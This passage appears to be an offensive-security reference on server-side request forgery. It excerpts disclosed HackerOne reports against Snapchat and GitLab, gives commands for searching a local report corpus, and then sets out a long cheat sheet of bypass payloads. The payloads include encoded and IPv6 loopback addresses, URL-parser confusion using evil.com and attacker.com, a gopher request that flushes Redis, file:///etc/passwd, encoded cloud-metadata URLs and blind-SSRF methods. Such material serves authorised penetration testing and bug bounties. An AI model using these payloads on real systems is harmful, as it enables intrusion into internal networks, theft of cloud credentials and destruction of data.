> Hey there, I was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app. Here are the steps: POC - Login to https://business.snapchat.com/ - Go to creative library - New Creative - Under "Topsnap Media", click on "Create" - Click on any of the templates and load it - Click on one of the images in the template - Replace - Import - This is where the SSRF exists .



### SSRF on project import via the remote_attachment_url on a Note

`#826361` · GitLab · $10,000 · high · 2020-06-07 · ▲359

> The Note model has an attachment which is provided by a CarrierWave uploader: One of the features this provides is the ability to download and attach a file via a url, see https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb L80. This means that the Note model has a method remote attachment url= which can be used to perform this action.



### Server Side Request Forgery mitigation bypass

`#632101` · GitLab · $0 · high · 2020-04-18 · ▲350

> This vulnerability allows attacker to send arbitrary requests to local network which hosts GitLab and read the response. This is possible due to flawed DNS rebinding protection. The attack is possible due to flaw here: https://gitlab.com/gitlab-org/gitlab-ce/blob/108c3cf16bed5733ffae086fb62c226961356560/lib/gitlab/url blocker.rb L59 The validate function performs DNS lookup to check whether the IP address of a domain belongs to the local network.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class ssrf --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class ssrf

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class ssrf

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class ssrf --min-bounty 1000

```



## Bypass Techniques



### Blocklist Bypasses (When `localhost`, `127.0.0.1`, `169.254.x.x` are blocked)



```

# IPv6 equivalents

http://[::1]/

http://[::ffff:127.0.0.1]/

http://[::ffff:169.254.169.254]/



# Decimal/octal/hex encoding of IP

http://2130706433/          (127.0.0.1 decimal)

http://0x7f000001/          (127.0.0.1 hex)

http://0177.0.0.1/          (octal)

http://127.1/               (short form)

http://0/                   (resolves to 0.0.0.0)



# DNS rebinding - register a domain that resolves to internal IP after first check

# Use https://lock.cmpxchg8b.com/rebinder.html



# Subdomain pointing to internal IP

http://localtest.me/         (resolves to 127.0.0.1)

http://127.0.0.1.nip.io/

http://customer.attacker.com/ (A record → 192.168.1.1)



# URL parser confusion

http://evil.com@127.0.0.1/

http://127.0.0.1#evil.com

http://127.0.0.1%25@evil.com  (URL encoding)

http://evil.com\.127.0.0.1/   (backslash)



# Protocol confusion

file:///etc/passwd

dict://127.0.0.1:6379/

gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)

sftp://attacker.com:11111/

ldap://127.0.0.1/



# Redirect chain bypass

https://allowlisted-domain.com → HTTP 301 → http://169.254.169.254/



# Case variation / URL encoding

http://Localhost/

http://127.0.0.1%2F@evil.com/

```



### App-layer input-encoding bypass (filter sees one thing, fetcher another)

When the endpoint takes the target URL **wrapped/encoded** — a base64 blob in the path, a

double-encoded param, a JSON-nested value — the front-end WAF/allowlist inspects the *raw*

input while the backend **decodes it before fetching**. Encode the internal target so the

filter never sees `169.254` / `localhost` in clear:

```

# target URL base64'd into a path segment the app decodes, then fetches

GET /proxy/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=/x.js   # = http://169.254.169.254/  (disclosed: reports/1189367)

# double-URL-encode the host so one decode pass survives the filter

url=http%253A%252F%252F169.254.169.254%252F

```

Always test whether the parameter is decoded once, twice, or base64'd before the fetch — the number of decode passes is the bug.



### Path-normalization / semicolon bypass (front-end filter vs origin path)

A front-end that blocks `url=` to internal hosts can be skipped when the origin re-normalizes

path segments the edge left intact — inject `;/`, `/../`, or matrix-param segments so the edge

routes it as benign but the origin resolves the SSRF fetch:

```

GET /;/;/resource/md/get/url?url=http://oast.example/   # edge ignores, origin fetches (disclosed: reports/2035332)

```

Full-read SSRF via this path-confusion reaches cloud-credential endpoints the direct `url=` param blocked.



### Schema/Protocol Bypasses

```

# When only http/https allowed but implementation is loose

http://169.254.169.254:80@evil.com/

//169.254.169.254/

```



### TOCTOU (Time-of-Check vs Time-of-Use)

- Validate URL → sleep → redirect to internal (race condition with DNS rebinding)

- Register a domain with 0-TTL, rotate DNS between validation and fetch calls



### When Response is Not Returned (Blind SSRF)

- Use DNS-only callbacks (data encoded in subdomain labels)

- Use timing differences for port scanning

- Use different HTTP methods (PUT/DELETE) to trigger distinct behaviors on internal services

- Chain with other bugs that leak response data (e.g., error messages, logs)



---
